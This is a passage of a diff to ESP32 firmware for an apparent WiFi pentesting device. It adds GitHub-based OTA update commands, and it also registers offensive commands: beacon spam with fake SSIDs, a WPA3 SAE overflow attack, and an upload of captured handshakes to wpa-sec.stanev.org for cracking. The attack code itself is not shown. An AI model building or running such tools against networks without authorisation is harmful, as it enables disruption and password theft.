+                    MY_LOG_INFO(TAG, "DNS2: " IPSTR, IP2STR(&static_dns2));
+                }
+            } else {
+                MY_LOG_INFO(TAG, "DHCP IP: " IPSTR ", Netmask: " IPSTR ", GW: " IPSTR,
+                            IP2STR(&ip_info.ip), IP2STR(&ip_info.netmask), IP2STR(&ip_info.gw));
+            }
+        } else {
+            MY_LOG_INFO(TAG, "No IP assigned yet. Wait for DHCP.");
+        }
+        if (ota_after_connect) {
+            if (!has_ip) {
+                MY_LOG_INFO(TAG, "OTA: no IP yet. Wait for DHCP.");
+                return 0;
+            }
+            if (!ota_start_check(NULL, false)) {
+                return 0;
+            }
+        }
         return 0;
     } else if (wifi_connect_result == -1) {
-        MY_LOG_INFO(TAG, "FAILED: Could not connect to '%s' (wrong password or AP not found)", ssid);
-        return 1;
+        MY_LOG_INFO(TAG, "FAILED: Connection to '%s' failed. Check SSID/password and signal.", ssid);
+        return 0;
     } else {
         MY_LOG_INFO(TAG, "TIMEOUT: Connection to '%s' timed out", ssid);
+        return 0;
+    }
+}
+
+static int cmd_ota_check(int argc, char **argv) {
+    const char *tag = NULL;
+    bool force_latest = false;
+
+    if (argc > 2) {
+        MY_LOG_INFO(TAG, "Usage: ota_check [latest|<tag>]");
         return 1;
     }
+    if (argc == 2) {
+        if (strcasecmp(argv[1], "latest") == 0) {
+            force_latest = true;
+        } else {
+            tag = argv[1];
+        }
+    }
+
+    if (!ensure_wifi_mode()) {
+        MY_LOG_INFO(TAG, "OTA: WiFi not ready");
+        return 1;
+    }
+    if (!ota_is_connected()) {
+        MY_LOG_INFO(TAG, "OTA: not connected or no IP. Use 'wifi_connect' first.");
+        return 1;
+    }
+
+    if (!ota_start_check(tag, force_latest)) {
+        return 1;
+    }
+
+    return 0;
+}
+
+static int cmd_ota_list(int argc, char **argv) {
+    (void)argc;
+    (void)argv;
+
+    if (!ensure_wifi_mode()) {
+        MY_LOG_INFO(TAG, "OTA: WiFi not ready");
+        return 1;
+    }
+    if (!ota_is_connected()) {
+        MY_LOG_INFO(TAG, "OTA: not connected or no IP. Use 'wifi_connect' first.");
+        return 1;
+    }
+
+    char api_url[256];
+    int res = snprintf(api_url, sizeof(api_url),
+                       "https://api.github.com/repos/%s/%s/releases?per_page=5",
+                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO);
+    if (res < 0 || res >= (int)sizeof(api_url)) {
+        return 1;
+    }
+
+    char *body = NULL;
+    size_t body_len = 0;
+    esp_err_t err = ota_http_get(api_url, &body, &body_len);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: list failed: %s", esp_err_to_name(err));
+        return 1;
+    }
+    (void)body_len;
+
+    cJSON *root = cJSON_Parse(body);
+    if (!root || !cJSON_IsArray(root)) {
+        cJSON_Delete(root);
+        free(body);
+        MY_LOG_INFO(TAG, "OTA: list parse failed");
+        return 1;
+    }
+
+    int idx = 0;
+    cJSON *item = NULL;
+    cJSON_ArrayForEach(item, root) {
+        cJSON *tag = cJSON_GetObjectItem(item, "tag_name");
+        cJSON *name = cJSON_GetObjectItem(item, "name");
+        cJSON *prerelease = cJSON_GetObjectItem(item, "prerelease");
+        cJSON *published = cJSON_GetObjectItem(item, "published_at");
+        if (!cJSON_IsString(tag)) {
+            continue;
+        }
+        const char *channel = (cJSON_IsBool(prerelease) && cJSON_IsTrue(prerelease)) ? "dev" : "main";
+        const char *title = (cJSON_IsString(name) && name->valuestring[0] != '\0') ? name->valuestring : "";
+        const char *date = (cJSON_IsString(published) && strlen(published->valuestring) >= 10)
+                               ? published->valuestring
+                               : "";
+        char date_buf[11] = {0};
+        if (date[0] != '\0') {
+            memcpy(date_buf, date, 10);
+            date_buf[10] = '\0';
+        }
+        MY_LOG_INFO(TAG, "OTA[%d]: %s (%s) %s %s",
+                    idx,
+                    tag->valuestring,
+                    channel,
+                    date_buf,
+                    title);
+        idx++;
+    }
+
+    cJSON_Delete(root);
+    free(body);
+    return 0;
+}
+
+static int cmd_ota_channel(int argc, char **argv) {
+    if (argc == 1) {
+        MY_LOG_INFO(TAG, "OTA channel: %s", ota_channel);
+        return 0;
+    }
+    if (argc != 2) {
+        MY_LOG_INFO(TAG, "Usage: ota_channel <main|dev>");
+        return 1;
+    }
+
+    if (strcasecmp(argv[1], "main") != 0 && strcasecmp(argv[1], "dev") != 0) {
+        MY_LOG_INFO(TAG, "Usage: ota_channel <main|dev>");
+        return 1;
+    }
+
+    snprintf(ota_channel, sizeof(ota_channel), "%s", argv[1]);
+    if (!ota_save_channel_to_nvs(ota_channel)) {
+        MY_LOG_INFO(TAG, "OTA: failed to save channel");
+        return 1;
+    }
+
+    MY_LOG_INFO(TAG, "OTA channel set to: %s", ota_channel);
+    return 0;
+}
+
+static int cmd_ota_info(int argc, char **argv) {
+    (void)argc;
+    (void)argv;
+
+    const esp_partition_t *boot = esp_ota_get_boot_partition();
+    const esp_partition_t *running = esp_ota_get_running_partition();
+    const esp_partition_t *next = esp_ota_get_next_update_partition(NULL);
+    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;
+    if (running) {
+        esp_ota_get_state_partition(running, &state);
+    }
+
+    MY_LOG_INFO(TAG, "OTA boot: %s offset=0x%lx size=0x%lx",
+                boot ? boot->label : "n/a",
+                boot ? (unsigned long)boot->address : 0UL,
+                boot ? (unsigned long)boot->size : 0UL);
+    MY_LOG_INFO(TAG, "OTA running: %s offset=0x%lx size=0x%lx state=%d",
+                running ? running->label : "n/a",
+                running ? (unsigned long)running->address : 0UL,
+                running ? (unsigned long)running->size : 0UL,
+                (int)state);
+    MY_LOG_INFO(TAG, "OTA next: %s offset=0x%lx size=0x%lx",
+                next ? next->label : "n/a",
+                next ? (unsigned long)next->address : 0UL,
+                next ? (unsigned long)next->size : 0UL);
+
+    const esp_partition_t *ota0 = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
+                                                           ESP_PARTITION_SUBTYPE_APP_OTA_0,
+                                                           NULL);
+    const esp_partition_t *ota1 = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
+                                                           ESP_PARTITION_SUBTYPE_APP_OTA_1,
+                                                           NULL);
+    const esp_partition_t *parts[2] = { ota0, ota1 };
+    const char *labels[2] = { "ota_0", "ota_1" };
+
+    for (int i = 0; i < 2; i++) {
+        const esp_partition_t *part = parts[i];
+        if (!part) {
+            MY_LOG_INFO(TAG, "APP[%d]: %s missing", i, labels[i]);
+            continue;
+        }
+        esp_app_desc_t desc = {0};
+        esp_ota_img_states_t part_state = ESP_OTA_IMG_UNDEFINED;
+        esp_ota_get_state_partition(part, &part_state);
+        esp_err_t desc_err = esp_ota_get_partition_description(part, &desc);
+        if (desc_err == ESP_OK) {
+            MY_LOG_INFO(TAG,
+                        "APP[%d]: %s offset=0x%lx size=0x%lx subtype=0x%x state=%d ver=%s build=%s %s",
+                        i,
+                        part->label,
+                        (unsigned long)part->address,
+                        (unsigned long)part->size,
+                        part->subtype,
+                        (int)part_state,
+                        desc.version,
+                        desc.date,
+                        desc.time);
+        } else {
+            MY_LOG_INFO(TAG, "APP[%d]: %s offset=0x%lx size=0x%lx subtype=0x%x state=%d",
+                        i,
+                        part->label,
+                        (unsigned long)part->address,
+                        (unsigned long)part->size,
+                        part->subtype,
+                        (int)part_state);
+        }
+    }
+
+    return 0;
+}
+
+static int cmd_ota_boot(int argc, char **argv) {
+    if (argc != 2) {
+        MY_LOG_INFO(TAG, "Usage: ota_boot <ota_0|ota_1>");
+        return 1;
+    }
+
+    const esp_partition_t *target = NULL;
+    if (strcasecmp(argv[1], "ota_0") == 0) {
+        target = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
+                                          ESP_PARTITION_SUBTYPE_APP_OTA_0,
+                                          NULL);
+    } else if (strcasecmp(argv[1], "ota_1") == 0) {
+        target = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
+                                          ESP_PARTITION_SUBTYPE_APP_OTA_1,
+                                          NULL);
+    } else {
+        MY_LOG_INFO(TAG, "Usage: ota_boot <ota_0|ota_1>");
+        return 1;
+    }
+
+    if (!target) {
+        MY_LOG_INFO(TAG, "OTA: target partition not found");
+        return 1;
+    }
+
+    esp_err_t err = esp_ota_set_boot_partition(target);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: set boot partition failed: %s", esp_err_to_name(err));
+        return 1;
+    }
+
+    MY_LOG_INFO(TAG, "OTA: boot set to %s, restarting", target->label);
+    esp_restart();
+    return 0;
 }
 
 static int cmd_list_hosts(int argc, char **argv) {
@@ -8949,6 +10911,24 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&save_handshake_cmd));
 
+    const esp_console_cmd_t wpasec_key_cmd = {
+        .command = "wpasec_key",
+        .help = "Set/read wpa-sec.stanev.org API key: wpasec_key set <key> | wpasec_key read",
+        .hint = NULL,
+        .func = &cmd_wpasec_key,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wpasec_key_cmd));
+
+    const esp_console_cmd_t wpasec_upload_cmd = {
+        .command = "wpasec_upload",
+        .help = "Upload all .pcap handshakes from SD card to wpa-sec.stanev.org",
+        .hint = NULL,
+        .func = &cmd_wpasec_upload,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wpasec_upload_cmd));
+
        const esp_console_cmd_t sae_overflow_cmd = {
         .command = "sae_overflow",
         .help = "Starts SAE WPA3 Client Overflow attack.",
@@ -8966,6 +10946,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&blackout_cmd));
+
+    const esp_console_cmd_t beacon_spam_cmd = {
+        .command = "start_beacon_spam",
+        .help = "Spam beacon frames with fake SSIDs on various channels",
+        .hint = "\"SSID1\" \"SSID2\" ...",
+        .func = &cmd_start_beacon_spam,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&beacon_spam_cmd));
 
     const esp_console_cmd_t gps_raw_cmd = {
         .command = "start_gps_raw",
@@ -9077,12 +11066,66 @@ static void register_commands(void)
 
     const esp_console_cmd_t wifi_connect_cmd = {
         .command = "wifi_connect",
-        .help = "Connect to AP as STA: wifi_connect <SSID> <Password>",
-        .hint = "<SSID> <Password>",
+        .help = "Connect to AP as STA: wifi_connect <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]",
+        .hint = "<SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]",
         .func = &cmd_wifi_connect,
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&wifi_connect_cmd));
+
+    const esp_console_cmd_t wifi_disconnect_cmd = {
+        .command = "wifi_disconnect",
+        .help = "Disconnect from current AP (STA)",
+        .hint = NULL,
+        .func = &cmd_wifi_disconnect,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wifi_disconnect_cmd));
+
+    const esp_console_cmd_t ota_check_cmd = {
+        .command = "ota_check",
+        .help = "Check GitHub release and apply OTA update (requires WiFi)",
+        .hint = NULL,
+        .func = &cmd_ota_check,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_check_cmd));
+
+    const esp_console_cmd_t ota_list_cmd = {
+        .command = "ota_list",
+        .help = "List recent GitHub releases (first 10)",
+        .hint = NULL,
+        .func = &cmd_ota_list,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_list_cmd));
+
+    const esp_console_cmd_t ota_channel_cmd = {
+        .command = "ota_channel",
+        .help = "Get/set OTA channel: ota_channel [main|dev]",
+        .hint = NULL,
+        .func = &cmd_ota_channel,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_channel_cmd));
+
+    const esp_console_cmd_t ota_info_cmd = {
+        .command = "ota_info",
+        .help = "Show OTA partition info",
+        .hint = NULL,
+        .func = &cmd_ota_info,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_info_cmd));
+
+    const esp_console_cmd_t ota_boot_cmd = {
+        .command = "ota_boot",
+        .help = "Set boot partition: ota_boot <ota_0|ota_1>",
+        .hint = NULL,
+        .func = &cmd_ota_boot,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_boot_cmd));
 
     const esp_console_cmd_t list_hosts_cmd = {
         .command = "list_hosts",
@@ -9264,6 +11307,10 @@ void app_main(void) {
 
 //     printf("Step 3: Init NVS\n");
     ESP_ERROR_CHECK(nvs_flash_init());
+    ota_load_channel_from_nvs();
+    wpasec_load_key_from_nvs();
+    ota_mark_valid_if_pending();
+    ota_log_boot_info();
     //printf("NVS initialized OK\n");
 
     channel_time_load_state_from_nvs();
@@ -9342,6 +11389,13 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  list_ssid");
       MY_LOG_INFO(TAG,"  packet_monitor <channel>");
       MY_LOG_INFO(TAG,"  ping");
+      MY_LOG_INFO(TAG,"  wifi_connect <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
+      MY_LOG_INFO(TAG,"  wifi_disconnect");
+      MY_LOG_INFO(TAG,"  ota_channel [main|dev]");
+      MY_LOG_INFO(TAG,"  ota_list");
+      MY_LOG_INFO(TAG,"  ota_check");
+      MY_LOG_INFO(TAG,"  ota_info");
+      MY_LOG_INFO(TAG,"  ota_boot <ota_0|ota_1>");
       MY_LOG_INFO(TAG,"  reboot");
       MY_LOG_INFO(TAG,"  sae_overflow");
       MY_LOG_INFO(TAG,"  scan_airtag");
@@ -9373,6 +11427,8 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  start_wardrive");
       MY_LOG_INFO(TAG,"  stop");
       MY_LOG_INFO(TAG,"  vendor set <on|off> | vendor read");
+      MY_LOG_INFO(TAG,"  wpasec_key set <key> | wpasec_key read");
+      MY_LOG_INFO(TAG,"  wpasec_upload");
 
     repl_config.prompt = ">";
     repl_config.max_cmdline_length = 100;
@@ -9382,6 +11438,8 @@ void app_main(void) {
 
     esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));
+
+    linenoiseSetHintsCallback((linenoiseHintsCallback *)&janos_console_hint);
 
     ESP_ERROR_CHECK(esp_console_start_repl(repl));
     vTaskDelay(pdMS_TO_TICKS(500));
@@ -9417,6 +11475,29 @@ void app_main(void) {
         report_ssid_file_status();
         if (vendor_is_enabled()) {
             ensure_vendor_file_checked();
+        }
+        // Check for wpa-sec API key file on SD card
+        {
+            FILE *wf = fopen("/sdcard/lab/wpa-sec.txt", "r");
+            if (wf) {
+                static char line[256];
+                memset(line, 0, sizeof(line));
+                if (fgets(line, sizeof(line), wf)) {
+                    // Strip trailing newline/carriage return
+                    size_t ln = strlen(line);
+                    while (ln > 0 && (line[ln - 1] == '\n' || line[ln - 1] == '\r')) {
+                        line[--ln] = '\0';
+                    }
+                    if (ln > 0) {
+                        if (wpasec_save_key_to_nvs(line)) {
+                            MY_LOG_INFO(TAG, "wpa-sec key updated from SD card into NVS.");
+                        } else {
+                            MY_LOG_INFO(TAG, "Failed to save wpa-sec key from SD card to NVS.");
+                        }
+                    }
+                }
+                fclose(wf);
+            }
         }
     } else {
         MY_LOG_INFO(TAG, "");
